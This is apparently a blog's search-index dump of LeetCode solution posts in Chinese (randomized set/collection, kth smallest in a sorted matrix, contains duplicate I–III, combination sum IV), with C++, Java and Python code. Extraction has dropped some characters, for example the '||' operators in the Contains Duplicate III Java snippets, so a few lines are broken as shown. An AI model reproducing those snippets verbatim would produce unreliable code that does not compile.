更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Insert Delete GetRandom O(1) - Duplicates allowed","slug":"leetcode-insert-delete-getrandom-o1-duplicates-allowed","date":"2016-08-09T02:01:07.000Z","updated":"2021-01-08T13:32:16.850Z","comments":true,"path":"leetcode-insert-delete-getrandom-o1-duplicates-allowed/","link":"","permalink":"https://www.hrwhisper.me/leetcode-insert-delete-getrandom-o1-duplicates-allowed/","excerpt":"leetcode Insert Delete GetRandom O(1) - Duplicates allowed Design a data structure that supports all following operations in average O(1) time. Note: Duplicate elements are allowed. insert(val): Inserts an item val to the collection. remove(val): Removes an item val from the collection if present. getRandom: Returns a random element from current collection of elements. The probability of each element being returned is linearly related to the number of same value the collection contains. Example: 1234567891011121314151617181920&#x2F;&#x2F; Init an empty collection.RandomizedCollection collection &#x3D; new RandomizedCollection();&#x2F;&#x2F; Inserts 1 to the collection. Returns true as the collection did not contain 1.collection.insert(1);&#x2F;&#x2F; Inserts another 1 to the collection. Returns false as the collection contained 1. Collection now contains [1,1].collection.insert(1);&#x2F;&#x2F; Inserts 2 to the collection, returns true. Collection now contains [1,1,2].collection.insert(2);&#x2F;&#x2F; getRandom should return 1 with the probability 2&#x2F;3, and returns 2 with the probability 1&#x2F;3.collection.getRandom();&#x2F;&#x2F; Removes 1 from the collection, returns true. Collection now contains [1,2].collection.remove(1);&#x2F;&#x2F; getRandom should return 1 and 2 both equally likely.collection.getRandom();","text":"leetcode Insert Delete GetRandom O(1) - Duplicates allowed Design a data structure that supports all following operations in average O(1) time. Note: Duplicate elements are allowed. insert(val): Inserts an item val to the collection. remove(val): Removes an item val from the collection if present. getRandom: Returns a random element from current collection of elements. The probability of each element being returned is linearly related to the number of same value the collection contains. Example: 1234567891011121314151617181920&#x2F;&#x2F; Init an empty collection.RandomizedCollection collection &#x3D; new RandomizedCollection();&#x2F;&#x2F; Inserts 1 to the collection. Returns true as the collection did not contain 1.collection.insert(1);&#x2F;&#x2F; Inserts another 1 to the collection. Returns false as the collection contained 1. Collection now contains [1,1].collection.insert(1);&#x2F;&#x2F; Inserts 2 to the collection, returns true. Collection now contains [1,1,2].collection.insert(2);&#x2F;&#x2F; getRandom should return 1 with the probability 2&#x2F;3, and returns 2 with the probability 1&#x2F;3.collection.getRandom();&#x2F;&#x2F; Removes 1 from the collection, returns true. Collection now contains [1,2].collection.remove(1);&#x2F;&#x2F; getRandom should return 1 and 2 both equally likely.collection.getRandom(); 题目地址：leetcode Insert Delete GetRandom O(1) - Duplicates allowed 题目大意: 要求实现一个数据结构（数允许重复），可以支持插入，删除，随机数生成。 他们的复杂度均要求O(1) 思路：其实和上一题 leetcode Insert Delete GetRandom O(1) 差不多，只不过这题允许重复，把字典里换成一个哈希表的set即可(注意，不可以是list) 比如如下的数据，list无法保证顺序！特别感谢@guanglightman 指出 12[&quot;RandomizedCollection&quot;, &quot;insert&quot;, &quot;insert&quot;, &quot;insert&quot;, &quot;insert&quot;, &quot;insert&quot;, &quot;insert&quot;, &quot;insert&quot;, &quot;insert&quot;,&quot;remove&quot;, &quot;remove&quot;, &quot;remove&quot;, &quot;remove&quot;, &quot;remove&quot;, &quot;remove&quot;][[], [3], [4], [5], [6], [1], [2], [1], [2], [3], [4], [5], [6], [2], [2]] C++ 123456789101112131415161718192021222324252627282930313233343536class RandomizedCollection &#123;private: unordered_map&lt;int, unordered_set&lt;int&gt;&gt; index; vector&lt;int&gt; output;public: /** Initialize your data structure here. */ RandomizedCollection() &#123;&#125; /** Inserts a value to the collection. Returns true if the collection did not already contain the specified element. */ bool insert(int val) &#123; bool return_val = index.find(val) == index.end(); index[val].insert(output.size()); output.push_back(val); return return_val; &#125; /** Removes a value from the collection. Returns true if the collection contained the specified element. */ bool remove(int val) &#123; if (index.find(val) == index.end()) return false; int last = output.back(); output.pop_back(); index[last].erase(output.size()); if (last != val) &#123; int _id = *index[val].begin(); index[val].erase(_id); index[last].insert(_id); output[_id] = last; &#125; if (index[val].empty()) index.erase(val); return true; &#125; /** Get a random element from the collection. */ int getRandom() &#123; return output[rand() % output.size()]; &#125;&#125;; Python 1234567891011121314151617181920212223242526272829303132333435363738394041424344import randomclass RandomizedCollection(object): def __init__(self): &quot;&quot;&quot; Initialize your data structure here. &quot;&quot;&quot; self.index = collections.defaultdict(set) self.output = [] def insert(self, val): &quot;&quot;&quot; Inserts a value to the collection. Returns true if the collection did not already contain the specified element. :type val: int :rtype: bool &quot;&quot;&quot; return_val = val not in self.index self.index[val].add(len(self.output)) self.output.append(val) return return_val def remove(self, val): &quot;&quot;&quot; Removes a value from the collection. Returns true if the collection contained the specified element. :type val: int :rtype: bool &quot;&quot;&quot; if val not in self.index: return False last = self.output.pop() self.index[last].remove(len(self.output)) if val != last: index = self.index[val].pop() self.index[last].add(index) self.output[index] = last if not self.index[val]: del self.index[val] return True def getRandom(self): &quot;&quot;&quot; Get a random element from the collection. :rtype: int &quot;&quot;&quot; return self.output[random.randint(0, len(self.output) - 1)] 本题是leetcode 381 Insert Delete GetRandom O(1) - Duplicates allowed 的题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Insert Delete GetRandom O(1)","slug":"leetcode-insert-delete-getrandom-o1","date":"2016-08-04T05:22:50.000Z","updated":"2021-01-08T13:32:16.850Z","comments":true,"path":"leetcode-insert-delete-getrandom-o1/","link":"","permalink":"https://www.hrwhisper.me/leetcode-insert-delete-getrandom-o1/","excerpt":"leetcode Insert Delete GetRandom O(1) Design a data structure that supports all following operations in O(1) time. insert(val): Inserts an item val to the set if not already present. remove(val): Removes an item val from the set if present. getRandom: Returns a random element from current set of elements. Each element must have the same probability of being returned. Example: 1234567891011121314151617181920212223&#x2F;&#x2F; Init an empty set.RandomizedSet randomSet &#x3D; new RandomizedSet();&#x2F;&#x2F; Inserts 1 to the set. Returns true as 1 was inserted successfully.randomSet.insert(1);&#x2F;&#x2F; Returns false as 2 does not exist in the set.randomSet.remove(2);&#x2F;&#x2F; Inserts 2 to the set, returns true. Set now contains [1,2].randomSet.insert(2);&#x2F;&#x2F; getRandom should return either 1 or 2 randomly.randomSet.getRandom();&#x2F;&#x2F; Removes 1 from the set, returns true. Set now contains [2].randomSet.remove(1);&#x2F;&#x2F; 2 was already in the set, so return false.randomSet.insert(2);&#x2F;&#x2F; Since 1 is the only number in the set, getRandom always return 1.randomSet.getRandom();","text":"leetcode Insert Delete GetRandom O(1) Design a data structure that supports all following operations in O(1) time. insert(val): Inserts an item val to the set if not already present. remove(val): Removes an item val from the set if present. getRandom: Returns a random element from current set of elements. Each element must have the same probability of being returned. Example: 1234567891011121314151617181920212223&#x2F;&#x2F; Init an empty set.RandomizedSet randomSet &#x3D; new RandomizedSet();&#x2F;&#x2F; Inserts 1 to the set. Returns true as 1 was inserted successfully.randomSet.insert(1);&#x2F;&#x2F; Returns false as 2 does not exist in the set.randomSet.remove(2);&#x2F;&#x2F; Inserts 2 to the set, returns true. Set now contains [1,2].randomSet.insert(2);&#x2F;&#x2F; getRandom should return either 1 or 2 randomly.randomSet.getRandom();&#x2F;&#x2F; Removes 1 from the set, returns true. Set now contains [2].randomSet.remove(1);&#x2F;&#x2F; 2 was already in the set, so return false.randomSet.insert(2);&#x2F;&#x2F; Since 1 is the only number in the set, getRandom always return 1.randomSet.getRandom(); 题目地址：leetcode Insert Delete GetRandom O(1) 题目大意： 要求实现一个数据结构，可以支持插入，删除，随机数生成。 他们的复杂度均要求O(1) 思路：用hash记录下标， 删除只需要和末尾元素调换即可 ps ：无聊身边没电脑用手机1A了此题。。。还发了blog 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import randomclass RandomizedSet(object): def __init__(self): &quot;&quot;&quot; Initialize your data structure here. &quot;&quot;&quot; self.output = [] self.index = &#123;&#125; def insert(self, val): &quot;&quot;&quot; Inserts a value to the set. Returns true if the set did not already contain the specified element. :type val: int :rtype: bool &quot;&quot;&quot; if val in self.index: return False self.index[val] = len(self.output) self.output.append(val) return True def remove(self, val): &quot;&quot;&quot; Removes a value from the set. Returns true if the set contained the specified element. :type val: int :rtype: bool &quot;&quot;&quot; if val not in self.index: return False index = self.index[val] last=self.output[-1] self.index[last] = index self.output[index] = last self.output.pop() del self.index[val] return True def getRandom(self): &quot;&quot;&quot; Get a random element from the set. :rtype: int &quot;&quot;&quot; index = random.randint(0,len(self.output)-1) return self.output[index]# Your RandomizedSet object will be instantiated and called as such:# obj = RandomizedSet()# param_1 = obj.insert(val)# param_2 = obj.remove(val)# param_3 = obj.getRandom() 本题是leetcode 380 Insert Delete GetRandom O(1)的题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Kth Smallest Element in a Sorted Matrix","slug":"leetcode-kth-smallest-element-sorted-matrix","date":"2016-08-01T03:01:40.000Z","updated":"2020-10-26T15:19:34.957Z","comments":true,"path":"leetcode-kth-smallest-element-sorted-matrix/","link":"","permalink":"https://www.hrwhisper.me/leetcode-kth-smallest-element-sorted-matrix/","excerpt":"leetcode Kth Smallest Element in a Sorted Matrix Given a n x n matrix where each of the rows and columns are sorted in ascending order, find the kth smallest element in the matrix. Note that it is the kth smallest element in the sorted order, not the kth distinct element. Example: 12345678matrix &#x3D; [ [ 1, 5, 9], [10, 11, 13], [12, 13, 15]],k &#x3D; 8,return 13. Note: You may assume k is always valid, 1 ≤ k ≤ n2.","text":"leetcode Kth Smallest Element in a Sorted Matrix Given a n x n matrix where each of the rows and columns are sorted in ascending order, find the kth smallest element in the matrix. Note that it is the kth smallest element in the sorted order, not the kth distinct element. Example: 12345678matrix &#x3D; [ [ 1, 5, 9], [10, 11, 13], [12, 13, 15]],k &#x3D; 8,return 13. Note: You may assume k is always valid, 1 ≤ k ≤ n2. 题目地址：leetcode Kth Smallest Element in a Sorted Matrix 题意：给定一个每一行每一列都排好序的矩阵，求其中第k大的元素 思路： 先想到的就是用堆。直接维护一个大小为k的堆，全部读入一遍，这样平均和最坏情况都为O(n^2 * logk) 很暴力，没有利用有序的特点。 因为每一行和每一列都是有序的了，因此维护一个最小堆，每次取出堆顶的元素，然后把它下方的元素放进堆(如果是第一行，还要把它右边的元素放入，这样不会重复。) 这样做K次后堆顶元素就是第K大的了。这样复杂度为多少呢？O(KlogK) 然而K最坏情况是n^2..... 因此，这个方法也一般。 PS: 本来写k - - &gt; 0 的，想到以前知乎上看到的 C语言有啥奇技淫巧， - - &gt;是趋向于， 哈哈哈~ 一本正经的胡说八道 12345678910111213141516171819202122struct Node &#123; int val, i, j; Node(int i, int j, int val) :i(i), j(j), val(val) &#123;&#125; bool operator &lt; (const Node &amp; x)const &#123; return val &gt; x.val; &#125;&#125;;class Solution &#123;public: int kthSmallest(vector&lt;vector&lt;int&gt;&gt;&amp; matrix, int k) &#123; priority_queue&lt;Node&gt; q; int n = matrix.size(); q.push(Node(0, 0, matrix[0][0])); while (--k &gt; 0) &#123; Node x = q.top(); q.pop(); if (x.i == 0 &amp;&amp; x.j + 1 &lt; n) q.push(Node(x.i, x.j + 1, matrix[x.i][x.j + 1])); if (x.i + 1 &lt; n) q.push(Node(x.i + 1, x.j, matrix[x.i + 1][x.j])); &#125; return q.top().val; &#125;&#125;; 我觉得用二分做最好，这个方法只要求行有序，和列有木有序并没有关系。 （或者列有序，行有序无序都没关系） 设L = min(matrix) R= max(matrix) , mid =( L + R ) / 2 ，mid为我们猜测的答案。 然后对于每一行，找它在该行中第几大（也是二分，找上界），累加和K比较。 值得注意的是枚举 答案应该用下界， 因为猜想的解不一定在数组中，不断的收缩直到找到在数组中的元素为止。 查找一行需要log(n) ，有n行所以nlog(n)，最坏下需要查找log(X)次（X= int最大值的时候logX仅仅才为32），X为最大最小数差值。 所以总复杂度为O(nlogn * logX) PS：其实是我一开始看成就行有序→_→，然后就直接二分了 C++ 123456789101112131415class Solution &#123;public: int kthSmallest(vector&lt;vector&lt;int&gt;&gt;&amp; matrix, int k) &#123; int n = matrix.size(); int L = matrix[0][0], R = matrix[n - 1][n - 1]; while (L &lt; R) &#123; int mid = L + ((R - L) &gt;&gt; 1); int temp = 0; for (int i = 0; i &lt; n; i++) temp += upper_bound(matrix[i].begin(), matrix[i].end(), mid) - matrix[i].begin(); if (temp &lt; k) L = mid + 1; else R = mid; &#125; return L; &#125;&#125;; Java 123456789101112131415161718192021222324public class Solution &#123; public int kthSmallest(int[][] matrix, int k) &#123; int n = matrix.length; int L = matrix[0][0], R = matrix[n - 1][n - 1]; while (L &lt; R) &#123; int mid = L + ((R - L) &gt;&gt; 1); int temp = 0; for (int i = 0; i &lt; n; i++) temp += binary_search(matrix[i], n, mid); if (temp &lt; k) L = mid + 1; else R = mid; &#125; return L; &#125; private int binary_search(int[] row,int R,int x)&#123; int L = 0; while (L &lt; R)&#123; int mid = (L + R) &gt;&gt; 1; if(row[mid] &lt;= x) L = mid + 1; else R = mid; &#125; return L; &#125;&#125; Python 1234567891011121314151617181920212223class Solution(object): def kthSmallest(self, matrix, k): &quot;&quot;&quot; :type matrix: List[List[int]] :type k: int :rtype: int &quot;&quot;&quot; n = len(matrix) L, R = matrix[0][0], matrix[n - 1][n - 1] while L &lt; R: mid = L + ((R - L) &gt;&gt; 1) temp = sum([self.binary_search(y,mid,n) for y in matrix]) if temp &lt; k: L = mid + 1 else: R = mid return L def binary_search(self, row, x, n): L, R = 0, n while L &lt; R: mid = (L + R) &gt;&gt; 1 if row[mid] &lt;= x: L = mid + 1 else: R = mid return L 上述的解法并没有利用到列有序的性质。 而下面的解法利用了列有序的性质，并将复杂度降到了O(nlogX) 其中X = max - min 我们仍采用猜测法，设L = min(matrix) R= max(matrix) , mid =( L + R ) / 2 ，mid为我们猜测的答案。 对于mid，我们不必再所有的行或列种执行二分查找，我们可以从左下角出发，若matrix[i][j] &lt;= mid，则下一次查询在右边（j++），并且，该列的所有元素均比mid小，因此可以cnt += (i+1) 对于matrix[i][j] &gt; mid，则 i - - 。 过程类似于240. Search a 2D Matrix II (题解在最下方) C++ 12345678910111213141516171819202122232425class Solution &#123;public: int kthSmallest(vector&lt;vector&lt;int&gt;&gt;&amp; matrix, int k) &#123; int n = matrix.size(); int L = matrix[0][0], R = matrix[n - 1][n - 1]; while (L &lt; R) &#123; int mid = L + ((R - L) &gt;&gt; 1); int temp = search_lower_than_mid(matrix, mid, n); if (temp &lt; k) L = mid + 1; else R = mid; &#125; return L; &#125; int search_lower_than_mid(const vector&lt;vector&lt;int&gt;&gt;&amp; matrix, int x, const int n) &#123; int i = n - 1, j = 0, cnt = 0; while (i &gt;= 0 &amp;&amp; j &lt; n) &#123; if (matrix[i][j] &lt;= x) &#123; j++; cnt += i + 1; &#125; else i--; &#125; return cnt; &#125;&#125;; Java 12345678910111213141516171819202122232425public class Solution &#123; public int kthSmallest(int[][] matrix, int k) &#123; int n = matrix.length; int L = matrix[0][0], R = matrix[n - 1][n - 1]; while (L &lt; R) &#123; int mid = L + ((R - L) &gt;&gt; 1); int temp = search_lower_than_mid(matrix, n, mid); if (temp &lt; k) L = mid + 1; else R = mid; &#125; return L; &#125; private int search_lower_than_mid(int[][] matrix,int n,int x) &#123; int i = n - 1, j = 0, cnt = 0; while (i &gt;= 0 &amp;&amp; j &lt; n) &#123; if (matrix[i][j] &lt;= x) &#123; j++; cnt += i + 1; &#125; else i--; &#125; return cnt; &#125;&#125; Python 12345678910111213141516171819202122232425262728class Solution(object): def kthSmallest(self, matrix, k): &quot;&quot;&quot; :type matrix: List[List[int]] :type k: int :rtype: int &quot;&quot;&quot; n = len(matrix) L, R = matrix[0][0], matrix[n - 1][n - 1] while L &lt; R: mid = L + ((R - L) &gt;&gt; 1) temp = self.search_lower_than_mid(matrix, n, mid) if temp &lt; k: L = mid + 1 else: R = mid return L def search_lower_than_mid(self, matrix, n, x): i, j = n - 1, 0 cnt = 0 while i &gt;= 0 and j &lt; n: if matrix[i][j] &lt;= x: j += 1 cnt += i + 1 else: i -= 1 return cnt 当然也可以从右上角到左下角，以Python为例，相应的函数改成如下即可： 12345678910def search_lower_than_mid(self, matrix, n, x): i, j = 0, n - 1 cnt = 0 while i &lt; n and j &gt;= 0: if matrix[i][j] &lt;= x: i += 1 cnt += j + 1 else: j -= 1 return cnt 本题是leetcode 378 Kth Smallest Element in a Sorted Matrix题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Contains Duplicate 整理","slug":"leetcode-contains-duplicate-i-ii-iii","date":"2016-07-30T07:13:09.000Z","updated":"2021-01-08T13:32:16.829Z","comments":true,"path":"leetcode-contains-duplicate-i-ii-iii/","link":"","permalink":"https://www.hrwhisper.me/leetcode-contains-duplicate-i-ii-iii/","excerpt":"本次题解包括： 217 Contains Duplicate 219 Contains Duplicate II 220 Contains Duplicate III","text":"本次题解包括： 217 Contains Duplicate 219 Contains Duplicate II 220 Contains Duplicate III 217. Contains Duplicate Given an array of integers, find if the array contains any duplicates. Your function should return true if any value appears at least twice in the array, and it should return false if every element is distinct. 题目地址: leetcode Contains Duplicate 题意：给定一个数组，求它是否有重复的元素 思路：Hash Python 1234567891011class Solution(object): def containsDuplicate(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: bool &quot;&quot;&quot; vis = set() for num in nums: if num in vis: return True vis.add(num) return False 写成oneline也行 1234567class Solution(object): def containsDuplicate(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: bool &quot;&quot;&quot; return len(set(nums)) != len(nums) C++ 1234567891011class Solution &#123;public: bool containsDuplicate(vector&lt;int&gt;&amp; nums) &#123; unordered_set&lt;int&gt; set; for (int num : nums) &#123; if (set.find(num) != set.end()) return true; set.insert(num); &#125; return false; &#125;&#125;; Java 12345678910class Solution &#123; public boolean containsDuplicate(int[] nums) &#123; HashSet&lt;Integer&gt; set = new HashSet&lt;&gt;(); for(int num:nums) &#123; if(set.contains((num))) return true; set.add(num); &#125; return false; &#125;&#125; 219. Contains Duplicate II Given an array of integers and an integer k, find out whether there are two distinct indices i and j in the array such that nums[i] = nums[j] and the difference between i and j is at most k. 题目地址: leetcode Contains Duplicate II 题意，给定一个数组和整数k，问数组中是否有i - j &lt;=k 并且nums[i] == nums[j]的两个不同的下标 思路：同样的hash，记录下标即可 C++ 123456789101112class Solution &#123;public: bool containsNearbyDuplicate(vector&lt;int&gt;&amp; nums, int k) &#123; unordered_map&lt;int, int&gt; hash; for (int i = 0; i &lt; nums.size(); i++) &#123; if (hash.find(nums[i]) != hash.end() &amp;&amp; i - hash[nums[i]] &lt;= k) return true; hash[nums[i]] = i; &#125; return false; &#125;&#125;; Java 12345678910class Solution &#123; public boolean containsNearbyDuplicate(int[] nums, int k) &#123; HashMap&lt;Integer, Integer&gt; index = new HashMap&lt;&gt;(); for (int i = 0; i &lt; nums.length; i++) &#123; if (i - index.getOrDefault(nums[i], -k - 1) &lt;= k) return true; index.put(nums[i], i); &#125; return false; &#125;&#125; Python 12345678910111213class Solution(object): def containsNearbyDuplicate(self, nums, k): &quot;&quot;&quot; :type nums: List[int] :type k: int :rtype: bool &quot;&quot;&quot; vis = &#123;&#125; for i, num in enumerate(nums): if num in vis and i - vis[num] &lt;= k: return True vis[num] = i return False 220. Contains Duplicate III Given an array of integers, find out whether there are two distinct indices i and j in the array such that the difference between nums[i] andnums[j] is at most t and the difference between i and j is at most k. 题目地址: leetcode Contains Duplicate III 题意：给定一个数组和两个整数t 和k ，求是否有不同的两个下标i和j，满足nums[i] - nums[j]&lt;= t &amp;&amp; i - j &lt;=k 思路： 方法1 平衡树的方法。复杂度O(nlogk) 题意有：-t &lt;= x- nums[i] &lt;= t 左边有 nums[i] - t &lt;= x 因此把符合条件的数构建成一颗平衡树，然后查找一个最小的x使得x&gt;= nums[i] - t 如果该x还满足 x &lt;= t + nums[i]就是我们要的答案啦 C++ 12345678910111213141516typedef long long LL;class Solution &#123;public: bool containsNearbyAlmostDuplicate(vector&lt;int&gt;&amp; nums, int k, int t) &#123; if (k &lt;= 0 || t &lt; 0) return false; set&lt;LL&gt; order; for (int i = 0; i &lt; nums.size(); i++) &#123; auto it = order.lower_bound((LL)nums[i] - (LL)t); if (it != order.end() &amp;&amp; *it &lt;= (LL)nums[i] + (LL)t) return true; if (i &gt;= k) order.erase(nums[i - k]); order.insert(nums[i]); &#125; return false; &#125;&#125;; Java 1234567891011121314class Solution &#123; public boolean containsNearbyAlmostDuplicate(int[] nums, int k, int t) &#123; if (k &lt;= 0 t &lt; 0) return false; TreeSet&lt;Long&gt; tree = new TreeSet&lt;&gt;(); for (int i = 0; i &lt; nums.length; i++) &#123; Long x = tree.ceiling((long) nums[i] - t); if (x != null &amp;&amp; x &lt;= (long) nums[i] + t) return true; if (i &gt;= k) tree.remove((long) nums[i - k]); tree.add((long) nums[i]); &#125; return false; &#125;&#125; 方法2 桶的方法 O(n) 思想是以t+1为间隔来分桶，对于一个数，将其分到第key = num / (t + 1) 个桶中，我们只需要查找相同的和相邻的桶的元素就可以判断有无重复。 比如t = 4，那么04为桶0，59为桶1，10~14为桶2 。 使用t+1个桶是为啥？这是为了避免除以0的错误，可能t = 0. 下面，C++和Java的版本，如果num为负数，那么key -= 1，因为比C++/Java 的负数取整是：-2 /3 = 0，这题这样是不行的。 而Python则OK, -2 // 3 = -1。 C++ 123456789101112131415161718192021222324typedef long long LL;class Solution &#123;public: bool containsNearbyAlmostDuplicate(vector&lt;int&gt;&amp; nums, int k, int t) &#123; if (k &lt;= 0 || t &lt; 0) return false; unordered_map&lt;LL, LL&gt; keyToVal; LL div = (LL) t + 1; for (int i = 0; i &lt; nums.size(); i++) &#123; LL num = (LL)nums[i]; LL key = num / div; if(num &lt; 0) key--; if (keyToVal.find(key) != keyToVal.end() || keyToVal.find(key + 1) != keyToVal.end() &amp;&amp; keyToVal[key + 1] - num &lt;= t || keyToVal.find(key - 1) != keyToVal.end() &amp;&amp; num - keyToVal[key - 1] &lt;= t) return true; if (i &gt;= k) &#123; LL key2 = (LL)nums[i - k] / div; keyToVal.erase(nums[i - k] &lt; 0 ? key2 - 1 : key2); &#125; keyToVal[key] = num; &#125; return false; &#125;&#125;; Java 12345678910111213141516171819202122class Solution &#123; public boolean containsNearbyAlmostDuplicate(int[] nums, int k, int t) &#123; if(k &lt;= 0 t &lt; 0) return false; HashMap&lt;Long, Long&gt; keyToNum = new HashMap&lt;&gt;(); long div = (long)t + 1; for (int i = 0; i &lt; nums.length; i++) &#123; long num = (long)nums[i]; long key = num / div; if(num &lt; 0) key--; if (keyToNum.containsKey(key) keyToNum.containsKey(key + 1) &amp;&amp; keyToNum.get(key + 1) - num &lt;= t keyToNum.containsKey(key - 1) &amp;&amp; num - keyToNum.get(key - 1) &lt;= t) return true; if (i &gt;= k) &#123; long key2 = ((long)nums[i - k]) / div; keyToNum.remove(nums[i - k] &lt; 0 ? key2 - 1 : key2); &#125; keyToNum.put(key, num); &#125; return false; &#125;&#125; Python 1234567891011121314151617181920class Solution(object): def containsNearbyAlmostDuplicate(self, nums, k, t): &quot;&quot;&quot; :type nums: List[int] :type k: int :type t: int :rtype: bool &quot;&quot;&quot; if k &lt;= 0 or t &lt; 0: return False key_to_val = &#123;&#125; for i, num in enumerate(nums): key = num // (t + 1) if key in key_to_val \\ or key + 1 in key_to_val and key_to_val[key + 1] - num &lt;= t \\ or key - 1 in key_to_val and num - key_to_val[key - 1] &lt;= t: return True if i &gt;=k: del key_to_val[nums[i-k] // (t + 1)] key_to_val[key] = num return False 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Combination Sum IV","slug":"leetcode-combination-sum-iv","date":"2016-07-25T05:43:31.000Z","updated":"2021-01-08T13:32:16.828Z","comments":true,"path":"leetcode-combination-sum-iv/","link":"","permalink":"https://www.hrwhisper.me/leetcode-combination-sum-iv/","excerpt":"leetcode Combination Sum IV Given an integer array with all positive numbers and no duplicates, find the number of possible combinations that add up to a positive integer target. Example: 123456789101112131415nums &#x3D; [1, 2, 3]target &#x3D; 4The possible combination ways are:(1, 1, 1, 1)(1, 1, 2)(1, 2, 1)(1, 3)(2, 1, 1)(2, 2)(3, 1)Note that different sequences are counted as different combinations.Therefore the output is 7. Follow up: What if negative numbers are allowed in the given array? How does it change the problem? What limitation we need to add to the question to allow negative numbers?","text":"leetcode Combination Sum IV Given an integer array with all positive numbers and no duplicates, find the number of possible combinations that add up to a positive integer target. Example: 123456789101112131415nums &#x3D; [1, 2, 3]target &#x3D; 4The possible combination ways are:(1, 1, 1, 1)(1, 1, 2)(1, 2, 1)(1, 3)(2, 1, 1)(2, 2)(3, 1)Note that different sequences are counted as different combinations.Therefore the output is 7. Follow up: What if negative numbers are allowed in the given array? How does it change the problem? What limitation we need to add to the question to allow negative numbers? 题目地址：leetcode Combination Sum IV 题意：给定一个元素互不相同且均为正数的数组，让你用该数组中的数组合成target（可以重复使用），问有多少种。 思路：DP可以有两种 dp[i] += dp[i-num] dp[i+num] += dp[i] 其实和 322 Coin Change 那题差不多。。。 第一种DP C++ 12345678910111213class Solution &#123;public: int combinationSum4(vector&lt;int&gt;&amp; nums, int target) &#123; vector&lt;int&gt; dp(target+1,0); dp[0] = 1; for(int i = 1;i &lt;= target ;i++)&#123; for(int num:nums)&#123; if(i &gt;= num) dp[i] += dp[i-num]; &#125; &#125; return dp[target]; &#125;&#125;; Java 12345678910111213public class Solution &#123; public int combinationSum4(int[] nums, int target) &#123; int[] dp= new int[target+1]; dp[0] = 1; for(int i = 1; i &lt;= target;i++)&#123; for(int num:nums)&#123; if(i &gt;= num) dp[i] += dp[i - num]; &#125; &#125; return dp[target]; &#125;&#125; Python 12345678910111213class Solution(object): def combinationSum4(self, nums, target): &quot;&quot;&quot; :type nums: List[int] :type target: int :rtype: int &quot;&quot;&quot; dp = [1] + [0] * target for i in xrange(1, target + 1): for x in nums: if i &gt;= x: dp[i] += dp[i - x] return dp[target] 第二种DP C++ 12345678910111213class Solution &#123;public: int combinationSum4(vector&lt;int&gt;&amp; nums, int target) &#123; vector&lt;int&gt; dp(target+1,0); dp[0] = 1; for(int i = 0; i &lt; target;i++)&#123; for(int num:nums)&#123; if(i + num &lt;= target) dp[i + num] += dp[i]; &#125; &#125; return dp[target]; &#125;&#125;; Java 12345678910111213public class Solution &#123; public int combinationSum4(int[] nums, int target) &#123; int[] dp= new int[target+1]; dp[0] = 1; for(int i = 0; i &lt; target;i++)&#123; for(int num:nums)&#123; if(i + num &lt;= target) dp[i + num] += dp[i]; &#125; &#125; return dp[target]; &#125;&#125; Python 12345678910111213class Solution(object): def combinationSum4(self, nums, target): &quot;&quot;&quot; :type nums: List[int] :type target: int :rtype: int &quot;&quot;&quot; dp = [1] + [0] * target for i in xrange(target + 1): for x in nums: if i + x &lt;= target: dp[i + x] += dp[i] return dp[target] 本题是leetcode 377 Combination Sum IV题解 